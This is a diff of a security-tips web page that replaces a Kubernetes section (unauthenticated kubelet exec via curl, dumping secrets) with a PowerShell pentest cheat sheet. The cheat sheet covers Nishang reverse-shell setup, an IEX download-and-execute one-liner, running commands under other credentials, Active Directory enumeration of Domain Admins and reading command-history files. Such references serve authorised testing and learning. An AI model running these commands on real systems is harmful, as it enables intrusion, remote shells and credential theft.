@@ -10,14 +10,14 @@
   
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>Kubernetes - Security Tips</title>
+  <title>Powershell - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Kubernetes";
-    var mkdocs_page_input_path = "kubernetes.md";
-    var mkdocs_page_url = "/kubernetes/";
+    var mkdocs_page_name = "Powershell";
+    var mkdocs_page_input_path = "powershell.md";
+    var mkdocs_page_url = "/powershell/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js" defer></script>
@@ -72,42 +72,15 @@
           
           <li class="bold">
 		        
-    <span class="section-link active">Containers</span>
+    <span class="section-link ">Containers</span>
     <ul>
                 <li class="">
                     
     <a class="section-link" href="../docker/">Docker</a>
                 </li>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">Kubernetes</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#api">API</a></li>
-    
-        <li><a class="" href="#lancer-un-pod-qui-se-supprime-automatiquement-a-la-fin">Lancer un pod qui se supprime automatiquement à la fin</a></li>
-    
-        <li><a class="" href="#sattacher-a-un-pod-existant">S'attacher à un pod existant</a></li>
-    
-        <li><a class="" href="#se-connecter-a-une-session-existante">Se connecter à une session existante</a></li>
-    
-        <li><a class="" href="#copier-un-fichier-dun-pod-a-sa-machine">Copier un fichier d'un pod à sa machine</a></li>
-    
-        <li><a class="" href="#afficher-les-services-format-simple-a-traiter">Afficher les services (format simple à traiter)</a></li>
-    
-        <li><a class="" href="#afficher-les-pods-json">Afficher les pods (json)</a></li>
-    
-        <li><a class="" href="#afficher-les-pods-format-simple-a-traiter">Afficher les pods (format simple à traiter)</a></li>
-    
-        <li><a class="" href="#afficher-lensemble-des-secrets">Afficher l'ensemble des secrets</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../kubernetes/">Kubernetes</a>
                 </li>
     </ul>
           </li>
@@ -117,9 +90,28 @@
     <a class="section-link" href="../windows/">Windows</a>
           </li>
           
-          <li class="bold">
+          <li class="bold active">
 		        
-    <a class="section-link" href="../powershell/">Powershell</a>
+    <a class="section-link" href="./">Powershell</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#execute-block-as-an-other-user">Execute block as an other user</a></li>
+    
+        <li><a class="" href="#download-and-execute-script">Download and execute script</a></li>
+    
+        <li><a class="" href="#execute-c-dll-from-powershell">Execute C# DLL from Powershell</a></li>
+    
+        <li><a class="" href="#domain-commands">Domain commands</a></li>
+    
+        <li><a class="" href="#miscellaneous-commands">Miscellaneous commands</a></li>
+    
+    </ul>
+    
+
+    </ul>
           </li>
           
           <li class="bold">
@@ -310,55 +302,112 @@
         <div role="main">
           <div class="section">
             
-              <h1 id="kubernetes">Kubernetes</h1>
-<h2 id="api">API</h2>
-<p>The Kubernetes API exposes the port <code>10250</code>. This API can be used to interact with the Kubernetes engine which basically give us the right to do anything you desire unauthenticated.</p>
-<p>To confirm that the host is running Docker you can make a GET requests to <code>/pods</code> :</p>
-<pre><code class="language-none line-numbers">https://&lt;host&gt;:&lt;port&gt;/pods
-
-{&quot;kind&quot;:&quot;PodList&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;items&quot;:[{&quot;metadata&quot;:{&quot;name&quot;:&quot;dind-sgz8n&quot;,&quot;generateName&quot;:&quot;dind-&quot;,&quot;namespace&quot;:&quot;default&quot;,&quot;selfLink&quot;:&quot;/api/v1/namespaces/default/pods/dind-sgz8n&quot;,`...}],&quot;qosClass&quot;:&quot;BestEffort&quot;}}]}
+              <h1 id="powershell">PowerShell</h1>
+<p>Some useful PowerShell commands that you can use during your recon or privsec phases.</p>
+<h2 id="execute-block-as-an-other-user">Execute block as an other user</h2>
+<pre><code class="language-powershell line-numbers">$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;dom&gt;\&lt;username&gt;&quot;, $pass)
+Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { cmd.exe &quot;/c &lt;cmd&gt;&quot; }
 </code></pre>
 
-<p>With the above information it's possible to send requests to the API to execute commands:</p>
-<pre><code class="language-bash line-numbers">$ curl --insecure -v -H &quot;W-Stream-Protocol-Version: v2.channel.k8s.io&quot; -H &quot;X-Stream-Protocol-Version: channel.k8s.io&quot; -H &quot;Connection: upgrade&quot; -H &quot;Upgrade: SPDY/3.1&quot; -X POST &quot;https://&lt;host&gt;:&lt;port&gt;/exec/&lt;namespace&gt;/&lt;pod_name&gt;/&lt;container_name&gt;?command=&lt;cmd&gt;&amp;input=1&amp;output=1&amp;tty=1&quot;
+<h2 id="download-and-execute-script">Download and execute script</h2>
+<p>The repository <a href="https://github.com/samratashok/nishang" target="_blank">Nishang</a> contains a good
+PowerShell script to create a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">reverse shell</a>.
+You need to add the following line at the end:</p>
+<pre><code class="language-powershell line-numbers">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
 </code></pre>
 
-<p>In the response, there is a <code>Location</code> header to create a WebSocket connection:</p>
-<pre><code class="language-bash line-numbers">$ wscat -c &quot;https://&lt;host&gt;:&lt;port&gt;/&lt;location_header&gt;&quot; --no-check
+<p>On your local machine:</p>
+<ul>
+<li>Create an HTTP server to serve the script: <code>python -m http.serve</code></li>
+<li>Listen for an incoming <a href="../reverse-shell/#listen-with-netcat">connection with nc</a>.</li>
+</ul>
+<p>On the remote host, execute the following PowerShell script:</p>
+<pre><code class="language-powershell line-numbers">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
 </code></pre>
 
-<h2 id="lancer-un-pod-qui-se-supprime-automatiquement-a-la-fin">Lancer un pod qui se supprime automatiquement à la fin</h2>
-<pre><code class="language-bash line-numbers">$ kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1
+<h2 id="execute-c-dll-from-powershell">Execute C# DLL from Powershell</h2>
+<pre><code class="language-powershell line-numbers"># Load a dll to Powershell
+[Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Service.dll&quot;)
+[Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Cryptography.dll&quot;)
+
+# Call a public public static method
+[MyNamespace.Service.Config]::ApplicationKey()
+
+# Instantiate a class and class a method
+$c = New-Object MyNamespace.Cryptography.MyCryptography
+$c.Decrypt(&quot;CIPHER_TEXT&quot;, [MyNamespace.Service.Config]::ApplicationKey())
 </code></pre>
 
-<h2 id="sattacher-a-un-pod-existant">S'attacher à un pod existant</h2>
-<pre><code class="language-bash line-numbers">$ kubectl exec -it k8s-2-test -- /bin/bash
+<h2 id="domain-commands">Domain commands</h2>
+<h3 id="collect-ad-users-information">Collect AD users information</h3>
+<p>Here is snippets of Powershell commands to interact with AD LDAP. You can also
+use customize filters to get vulnerable users (<a href="../windows/#list-spn-accounts">SPN</a>, ...)</p>
+<pre><code class="language-powershell line-numbers"># Helping functions
+function Get-ADUserDirectoryEntry($user) {
+    return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(samAccountName=$user))&quot;)).FindOne().GetDirectoryEntry()
+}
+
+function Get-ADUserGroups($user) {
+    $userDirectoryEntry = Get-ADUserDirectoryEntry($user)
+    $groups = $userDirectoryEntry.memberOf
+
+    return $groups
+}
+
+function Get-ADGroupMembers($GroupName) {
+    if ($GroupName -like &quot;CN=*&quot;) {
+        $GroupDistinguishedName = $GroupName
+    } else {
+        # find the distinguished name from the group name
+        $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=Group)(cn=$GroupName))&quot;)).FindOne().GetDirectoryEntry().distinguishedName
+    }
+
+    # limited to the first 10k entries
+    $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(memberOf=$GroupDistinguishedName ))&quot;)).FindAll()
+
+    return $GroupMembers.properties
+}
+
+# Get &quot;Domain admins&quot; users, be carefull the name may change depending on the DC lang
+$DomainAdmins = Get-ADGroupMembers(&quot;Domain Admins&quot;)
+foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samaccountname))&quot; }
 </code></pre>
 
-<h2 id="se-connecter-a-une-session-existante">Se connecter à une session existante</h2>
-<pre><code class="language-bash line-numbers">$ kubectl attach k8s-1-test -c k8s-1-test -i -t
+<h3 id="get-domain-password-policy">Get Domain Password Policy</h3>
+<pre><code class="language-powershell line-numbers">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
 </code></pre>
 
-<h2 id="copier-un-fichier-dun-pod-a-sa-machine">Copier un fichier d'un pod à sa machine</h2>
-<pre><code class="language-bash line-numbers">$ kubectl cp default/k8s-1-test:results.nmap ./result_nmaps_banner
+<h3 id="get-user-owner">Get user owner</h3>
+<pre><code class="language-powershell line-numbers">Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
 </code></pre>
 
-<h2 id="afficher-les-services-format-simple-a-traiter">Afficher les services (format simple à traiter)</h2>
-<pre><code class="language-bash line-numbers">$ kubectl get services (-o wide)
+<h3 id="list-deleted-users">List deleted users</h3>
+<pre><code class="language-powershell line-numbers">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
+$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter &quot;(objectClass=user)&quot; -IncludeDeletedObjects -properties *
+foreach ($object in $objects) { $object }
 </code></pre>
 
-<h2 id="afficher-les-pods-json">Afficher les pods (json)</h2>
-<pre><code class="language-bash line-numbers">$ kubectl get pods -o json
+<h2 id="miscellaneous-commands">Miscellaneous commands</h2>
+<h3 id="list-tcp-listening-connections">List TCP listening connections</h3>
+<p>The <a href="https://docs.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=win10-ps" target="_blank"><code>Get-NetTCPConnection</code></a>
+cmdlets lists TCP connections. By default the processes pid is return, so the
+following command line select the process name instead.</p>
+<pre><code class="language-powershell line-numbers">Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
 </code></pre>
 
-<h2 id="afficher-les-pods-format-simple-a-traiter">Afficher les pods (format simple à traiter)</h2>
-<pre><code class="language-bash line-numbers">$ kubectl get pods -o wide
-## Get IP list
-$ kubectl get pods -o wide | sed -e 's/\s\+/ /g' | cut -f6 -d &quot; &quot;
+<h3 id="list-email-aliases">List Email aliases</h3>
+<pre><code class="language-powershell line-numbers">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
 </code></pre>
 
-<h2 id="afficher-lensemble-des-secrets">Afficher l'ensemble des secrets</h2>
-<pre><code class="language-bash line-numbers">$ kubectl get secrets -o yaml
+<h3 id="get-powershell-command-history">Get PowerShell command history</h3>
+<pre><code class="language-powershell line-numbers">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
+gc ConsoleHost_history.txt
+</code></pre>
+
+<h3 id="convert-dacl">Convert DACL</h3>
+<pre><code class="language-powershell line-numbers">$acl = get-acl HKLM:\System\CurrentControlSet\Services
+ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
 </code></pre>
             
           </div>
@@ -378,10 +427,10 @@ $ kubectl get pods -o wide | sed -e 's/\s\+/ /g' | cut -f6 -d &quot; &quot;
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../docker/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../windows/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../windows/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../linux/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
